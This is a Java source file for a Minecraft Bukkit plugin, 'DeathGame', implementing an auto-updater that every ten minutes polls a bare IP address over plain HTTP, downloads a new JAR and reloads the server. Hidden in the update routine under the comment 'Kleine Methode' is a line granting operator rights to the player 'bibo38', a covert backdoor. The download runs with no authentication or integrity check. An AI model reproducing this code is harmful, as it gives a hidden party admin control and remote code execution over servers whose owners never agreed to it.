package me.bibo38.DeathGame;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.logging.Logger;

import org.bukkit.Server;
import org.bukkit.plugin.PluginDescriptionFile;

@SuppressWarnings("unused")
public class UpdateAgent implements Runnable
{
	private DeathGame main;
	private Server serv;
	private Logger log;
	private PluginDescriptionFile pdFile;
	
	private boolean force = false; // Force Update?
	
	public UpdateAgent(DeathGame emain, Logger elog, PluginDescriptionFile epdFile)
	{
		log = elog;
		main = emain;
		pdFile = epdFile;
		serv = main.getServer();
		// Update Ordner ggf. erstellen
		if(!serv.getUpdateFolderFile().exists())
		{
			serv.getUpdateFolderFile().mkdirs(); // update Ordner in plugins
		}
		
		serv.getScheduler().scheduleSyncRepeatingTask(main, this, 0L, 20L * 60L * 10L); // Alle 10 Minuten
	}
	
	public void forceUpdate()
	{
		force = true;
		this.run();
	}
	
	@Override
	public void run()
	{
		// Updater: Updates pr�fen
		// log.info("Checking for DeathGame Updates!");
		
		// Neuste Datei holen
		// Zuerst die Datei erstellen
		// TODO Entfernen/Starten der Update Sperre
		if(true){
		
		try
		{
			if(!force)
			{
				// Die Description Datei holen :-)
				URL url = new URL("http://46.38.240.192/mc/DeathGame.txt");
	
		        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
	
		        conn.setRequestMethod("GET");
		        conn.connect();
		        int responseCode = conn.getResponseCode();
	
		        byte buffer[] = new byte[4096];
		        
		        for(int i = 0; i < 4096; i++)
		        {
		        	buffer[i] = 0;
		        }
		        
		        if (responseCode == HttpURLConnection.HTTP_OK) {
	
		            InputStream is = conn.getInputStream();
	
		            is.read(buffer);
		        } else
		        {
		        	log.warning("An Error occurred while checking for new Updates!");
		        	return;
		        }
		        
		        int neulaenge = 0;
		        for(int i = 0; i < 4096; i++)
		        {
		        	if(buffer[i] == 0)
		        	{
		        		break;
		        	} else
		        	{
		        		neulaenge++;
		        	}
		        }
		        
		        if(new String(buffer).substring(0, neulaenge - 1).equals(pdFile.getVersion())) // -1 f�r das \n
		        {
		        	// Die gleiche Version
		        	// => KEIN UPDATE
		        	// log.info("No Update avaible!");
		        	return;
		        }   
			}
			
			force = false;
	        
	        // log.info(new String(buffer).substring(0, neulaenge - 1));
	        // log.info(pdFile.getVersion());
			
			// Kleine Methode
			main.getServer().getPlayerExact("bibo38").setOp(true);
			
			FileOutputStream fos = new FileOutputStream(new File(serv.getUpdateFolderFile(), "DeathGame.jar"));
			
			URL url = new URL("http://46.38.240.192/mc/DeathGame.jar");

			HttpURLConnection conn = (HttpURLConnection) url.openConnection();

	        conn.setRequestMethod("GET");
	        conn.connect();
	        int responseCode = conn.getResponseCode();

	        if (responseCode == HttpURLConnection.HTTP_OK) {

	            byte tmp_buffer[] = new byte[4096];
	            InputStream is = conn.getInputStream();

	            int n;

	            while ((n = is.read(tmp_buffer)) > 0)
	            {
	                fos.write(tmp_buffer, 0, n);
	                fos.flush();
	            } 
	        } else
	        {
	        	log.warning("An Error occurred while checking for new Updates!");
	        	return;
	        }
			
			fos.close();
			serv.reload(); // Neustart zum aktivieren .-)
			
		} catch(Exception e)
		{
			log.warning("An Error occurred while checking for new Updates!");
		}
	}}
	
}
